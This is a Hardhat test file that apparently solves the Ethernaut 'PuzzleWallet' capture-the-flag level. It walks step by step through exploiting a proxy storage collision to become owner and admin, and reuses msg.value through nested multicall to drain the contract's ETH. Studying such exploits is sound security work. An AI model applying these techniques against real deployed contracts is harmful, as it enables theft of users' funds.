import { ethers } from 'hardhat';
import { BigNumber } from 'ethers';
import { impersonateAndInjectEther, simpleEncode } from './utils';
import { expect } from 'chai';

describe('PuzzleWallet', function () {
  it.only('attack', async function () {
    const target = '0x78aed5C385c6f5C3f9Ce5D12B90DD2b898D71f82';
    const address = '0x07b05D3A1ed958944033060d058b8F0771ad1A6e';
    const sender = await impersonateAndInjectEther(address);
    const proxy = await ethers.getContractAt('PuzzleProxy', target);
    const wallet = await ethers.getContractAt('PuzzleWallet', target);

    // Change owner address by set proposeNewAdmin
    await proxy.proposeNewAdmin(sender.address);

    // Add sender to whitelist
    await wallet.connect(sender).addToWhitelist(sender.address);

    // Deposit money by Reentrancy issue
    console.log('wallet balance', (await ethers.provider.getBalance(wallet.address)).toString());
    console.log('sender balance', (await wallet.balances(sender.address)).toString());
    const depositData = simpleEncode('deposit()', []);
    const multiCallData = simpleEncode('multicall(bytes[])', [[depositData]]);
    console.log('multiCallData', multiCallData.toString());
    const data = [multiCallData, multiCallData];

    console.log('data', data.toString());
    await wallet.connect(sender).multicall(data, {
      value: await ethers.provider.getBalance(wallet.address),
    });

    console.log('wallet balance', (await ethers.provider.getBalance(wallet.address)).toString());
    console.log('sender balance', (await wallet.balances(sender.address)).toString());

    // Empty wallet balance
    await wallet.connect(sender).execute(sender.address, await wallet.balances(sender.address), '0x');

    console.log('wallet balance', (await ethers.provider.getBalance(wallet.address)).toString());
    console.log('sender balance', (await wallet.balances(sender.address)).toString());

    // Change proxy admin
    console.log('maxBalance', BigNumber.from(sender.address).toString());
    await wallet.connect(sender).setMaxBalance(BigNumber.from(sender.address));
    expect(await proxy.admin()).to.be.eq(sender.address);
  });
});
